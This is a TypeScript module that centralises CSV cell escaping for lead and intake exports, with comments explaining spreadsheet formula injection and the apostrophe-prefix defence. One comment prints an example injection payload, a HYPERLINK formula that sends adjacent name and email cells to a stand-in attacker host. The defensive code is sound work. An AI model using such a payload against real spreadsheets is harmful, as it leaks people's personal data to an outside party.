// The CSV format, and nothing else.
//
// ───────────────────────────────────────────────────────────────────────────
// THE ONE OWNER OF THE ESCAPING RULE. THERE WERE THREE.
// ───────────────────────────────────────────────────────────────────────────
//
// `leads.csv.ts` had a local `cell()`. `intake.csv.ts` had an identical one.
// The scoped exporter added a third. Three copies of the rule that stops a
// spreadsheet executing what a stranger typed into a public form — which is
// precisely the failure CLAUDE.md names under "Two places that own a format".
// Copies agree until the day somebody hardens one of them, and then the file
// nobody remembered is the one an operator opens.
//
// WHY THIS IS ITS OWN MODULE AND NOT PART OF export.ts
//
// Two reasons, and the second is the one that forced it.
//
// 1. The format has no business knowing about Supabase. Quoting a string is
//    not a database concern, and a module that imports a client to do it
//    cannot be used anywhere a client is not configured.
//
// 2. `scripts/acceptance.ts` runs under `node --experimental-strip-types`,
//    whose ESM resolver will not guess a missing file extension. Importing
//    `export.ts` there fails on ITS import of `./supabase`, so acceptance case
//    E13 could not test the shipped escaping at all — it could only test a
//    copy, which is the exact thing this module exists to prevent. The same
//    resolver trap has taken out both retriever sweeps before; CLAUDE.md
//    documents it.
//
// **This file must therefore import nothing.** Adding an import here — even a
// type-only one from a module that has its own — puts E13 back to testing a
// replica of the rule instead of the rule.
//
// ───────────────────────────────────────────────────────────────────────────
// THE ATTACK, IN FULL, BECAUSE THE FIX LOOKS LIKE A BUG
// ───────────────────────────────────────────────────────────────────────────
//
// Excel, Sheets and LibreOffice evaluate a cell beginning `=`, `+`, `-`, `@`,
// tab or carriage return as a FORMULA when the file is opened. Every cell in
// these exports holds text somebody typed into a public form.
//
// So an answer beginning
//
//     =HYPERLINK("https://evil.example/?d="&A2&B2,"Click for details")
//
// arrives in an operator's spreadsheet as a live link built out of the name
// and email address sitting beside it. One click and the row has left the
// building. Nothing about the file looks unusual.
//
// The benign half is just as real and is why the rule cannot be narrowed to
// `=`. `+91 80 1234 5678` is a valid Indian mobile number and a subtraction,
// and this practice sells into India.
//
// The defusal is a leading apostrophe, which every spreadsheet treats as
// "this is text" and does not display. `unprefixFormula()` in import.ts is its
// exact inverse and strips it ONLY when a trigger character follows, so
// `O'Brien` survives a round trip.
//
// IF YOU ARE HERE BECAUSE AN EXPORTED CELL HAS A STRAY APOSTROPHE: that is
// this working. Do not remove it.

/**
 * The characters a spreadsheet reads as "this cell is a formula".
 *
 * Keep `\t` and `\r`. A leading tab or carriage return is a formula prefix in
 * Excel just as surely as `=` is, and both survive a round trip through a text
 * field without anybody noticing them.
 */
export const FORMULA_PREFIX = /^[=+\-@\t\r]/;

/** Make one value inert. See the note above before changing this. */
export const formulaSafe = (text: string): string =>
  FORMULA_PREFIX.test(text) ? `'${text}` : text;

/**
 * One cell: defused, then quoted, always.
 *
 * Quoting unconditionally rather than only-when-needed is deliberate. The
 * conditional version has to decide correctly about commas, quotes, newlines,
 * leading and trailing spaces and the apostrophe just added — and every one of
 * those decisions is a chance to corrupt exactly the long free-text answers
 * this exists to carry.
 */
export const csvCell = (value: unknown): string => {
  const text = value === null || value === undefined ? '' : String(value);
  return `"${formulaSafe(text).replace(/"/g, '""')}"`;
};

export interface CsvColumn {
  key: string;
  header: string;
}

/**
 * A whole document.
 *
 * CRLF because RFC 4180 says so and because Excel on Windows is the reader
 * this is written for; the parser in import.ts accepts either ending. The
 * leading BOM is what stops Excel mangling a non-ASCII name or a ₹ sign.
 */
export function csvDocument(
  columns: readonly CsvColumn[],
  rows: readonly Record<string, unknown>[],
): string {
  const lines = [
    columns.map((c) => csvCell(c.header)).join(','),
    ...rows.map((row) => columns.map((c) => csvCell(row[c.key])).join(',')),
  ];
  return `﻿${lines.join('\r\n')}\r\n`;
}
